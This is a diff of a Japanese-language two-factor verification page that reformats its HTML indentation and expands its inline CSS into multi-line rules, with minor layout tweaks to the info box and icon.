@@ -207,53 +207,166 @@
           </div>
 
           <div class="blue-info">
-              <div class="info-inner">
-                  <div class="info-icon">
-                      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#007aff" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
-                  </div>
-                  <div class="info-content">
-                      QRコードが表示されない又は表示はされてるがブラウザ側で読み込むボタンがない場合はアプリに表示される認証コードでお試しください。
-                      <div class="blue-link-inline"></div>
-                  </div>
-              </div>
-          </div>
+    <div class="info-inner">
+        <div class="info-icon">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#007aff" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
+        </div>
+        <div class="info-content">
+            QRコードが表示されない又は表示はされてるがブラウザ側で読み込むボタンがない場合はアプリに表示される認証コードでお試しください。
+            <div class="blue-link-inline"></div>
+        </div>
+    </div>
+</div>
 
        
-          <p id="login-error-message" class="error-text" style="display: none; text-align: center;">
-              認証コードが間違っています。もう一度ご確認ください。
-          </p>
+<p id="login-error-message" class="error-text" style="display: none; text-align: center;">
+    認証コードが間違っています。もう一度ご確認ください。
+</p>
 
-          <button type="submit" id="submit" class="submit-btn">認証する</button>
+<button type="submit" id="submit" class="submit-btn">認証する</button>
 
-          <div class="resend-section">
-              <p class="resend-txt">認証コードを再送 (<span id="timer">50</span> 秒後)</p>
-              <p class="blue-link">認証コードが届かない場合</p>
-          </div>
-      
+<div class="resend-section">
+    <p class="resend-txt">認証コードを再送 (<span id="timer">50</span> 秒後)</p>
+    <p class="blue-link">認証コードが届かない場合</p>
+</div>
 
-    </form> 
+</form> 
 
-  <style>
-.s2_fixed { display: flex; flex-direction: column; align-items: center; padding: 48px 24px; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #fff; color: #1a1a1a; text-align: center; }
-    .icon-wrap { margin-bottom: 28px; }
-    .main-txt { font-size: 17px; font-weight: 700; margin: 0 0 8px 0; }
-    .phone-txt { color: #007aff; font-size: 14.5px; margin: 0 0 35px 0; }
-    .dc-flex { display: flex; align-items: center; justify-content: center; margin-bottom: 35px; gap: 18px; }
-    .dc-label { font-size: 28px; font-weight: 700; }
-    .input-container { position: relative; width: 175px; height: 48px; }
-    .lines { display: flex; justify-content: space-between; width: 100%; position: absolute; bottom: 5px; }
-    .lines span { width: 36px; height: 42px; border-bottom: 2.5px solid #e0e0e0; font-size: 32px; font-weight: 700; text-align: center; display: flex; align-items: center; justify-content: center; }
-    #dc_input { position: absolute; top:0; left:0; width:100%; height:100%; opacity:0; z-index:10; cursor: pointer; }
-    .blue-info { background: #eef6ff; border-radius: 12px; padding: 16px; max-width: 340px; margin-bottom: 30px; }
-    .info-inner { display: flex; gap: 12px; }
-    .info-content { font-size: 13.5px; color: #333; line-height: 1.55; text-align: left; }
-    .blue-link-inline { color: #007aff; font-weight: 700; margin-top: 10px; cursor: pointer; text-align: center; }
-    .error-text { color: #ed3242; font-weight: 700; font-size: 14px; margin-bottom: 15px; }
-    .submit-btn { width: 100%; max-width: 340px; padding: 16px; background: #ed3242; color: #fff; border: none; border-radius: 8px; font-weight: 700; font-size: 16px; cursor: pointer;}
-    .resend-section { margin-top: 35px; text-align: center; }
-    .resend-txt { color: #b3b3b3; font-size: 14px; margin-bottom: 25px; }
-    .blue-link { color: #007aff; font-weight: 500; font-size: 15px; }
-  </style>
+<style>
+    .s2_fixed {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        padding: 48px 24px;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        background: #fff;
+        color: #1a1a1a;
+        text-align: center;
+    }
+    .icon-wrap {
+        margin-bottom: 28px;
+    }
+    .main-txt {
+        font-size: 17px;
+        font-weight: 700;
+        margin: 0 0 8px 0;
+    }
+    .phone-txt {
+        color: #007aff;
+        font-size: 14.5px;
+        margin: 0 0 35px 0;
+    }
+    .dc-flex {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin-bottom: 35px;
+        gap: 18px;
+    }
+    .dc-label {
+        font-size: 28px;
+        font-weight: 700;
+    }
+    .input-container {
+        position: relative;
+        width: 175px;
+        height: 48px;
+    }
+    .lines {
+        display: flex;
+        justify-content: space-between;
+        width: 100%;
+        position: absolute;
+        bottom: 5px;
+    }
+    .lines span {
+        width: 36px;
+        height: 42px;
+        border-bottom: 2.5px solid #e0e0e0;
+        font-size: 32px;
+        font-weight: 700;
+        text-align: center;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+    }
+    #dc_input {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0;
+        z-index: 10;
+        cursor: pointer;
+    }
+    .blue-info {
+        background: #eef6ff;
+        border-radius: 12px;
+        padding: 16px;
+        max-width: 340px;
+        width: 100%;
+        margin: 0 auto 30px auto;
+    }
+    .info-inner {
+        display: flex;
+        gap: 12px;
+        align-items: flex-start;
+    }
+    .info-icon {
+        flex-shrink: 0;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        width: 20px;
+        height: 20px;
+    }
+    .info-content {
+        font-size: 13.5px;
+        color: #333;
+        line-height: 1.55;
+        text-align: left;
+    }
+    .blue-link-inline {
+        color: #007aff;
+        font-weight: 700;
+        margin-top: 10px;
+        cursor: pointer;
+        text-align: center;
+    }
+    .error-text {
+        color: #ed3242;
+        font-weight: 700;
+        font-size: 14px;
+        margin-bottom: 15px;
+    }
+    .submit-btn {
+        width: 100%;
+        max-width: 340px;
+        padding: 16px;
+        background: #ed3242;
+        color: #fff;
+        border: none;
+        border-radius: 8px;
+        font-weight: 700;
+        font-size: 16px;
+        cursor: pointer;
+    }
+    .resend-section {
+        margin-top: 35px;
+        text-align: center;
+    }
+    .resend-txt {
+        color: #b3b3b3;
+        font-size: 14px;
+        margin-bottom: 25px;
+    }
+    .blue-link {
+        color: #007aff;
+        font-weight: 500;
+        font-size: 15px;
+    }
+</style>
 
   <script>
     document.addEventListener("DOMContentLoaded", () => {
